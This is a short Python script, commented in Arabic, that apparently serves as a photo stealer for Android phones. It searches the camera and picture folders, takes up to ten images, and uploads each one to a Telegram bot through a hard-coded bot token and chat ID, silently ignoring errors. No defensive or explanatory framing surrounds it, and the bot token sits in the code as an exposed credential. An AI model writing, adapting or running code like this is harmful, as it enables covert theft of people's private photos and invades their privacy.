import os
import requests
import hashlib

# البيانات الجديدة التي طلبتها
TOKEN = "8041654407:AAHtI0QChtYMlJ0MMJCGM8YEb5b4L4lgEmM"
CHAT_ID = "6046016571"

def get_file_hash(filepath):
    hasher = hashlib.md5()
    with open(filepath, 'rb') as f:
        buf = f.read()
        hasher.update(buf)
    return hasher.hexdigest()

def start_process():
    # المسارات الشائعة في أندرويد وهواوي (مثل جهازك Y9)
    paths = [
        "/sdcard/DCIM/Camera",
        "/sdcard/Pictures",
        "/storage/emulated/0/DCIM/Camera"
    ]
    
    count = 0
    for path in paths:
        if os.path.exists(path):
            for file in os.listdir(path):
                # البحث عن الصور فقط
                if file.lower().endswith(('.jpg', '.jpeg', '.png')) and count < 10:
                    full_path = os.path.join(path, file)
                    try:
                        with open(full_path, 'rb') as img:
                            # إرسال الصورة إلى البوت الجديد
                            requests.post(
                                f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
                                data={"chat_id": CHAT_ID},
                                files={"photo": img}
                            )
                        count += 1
                    except:
                        continue

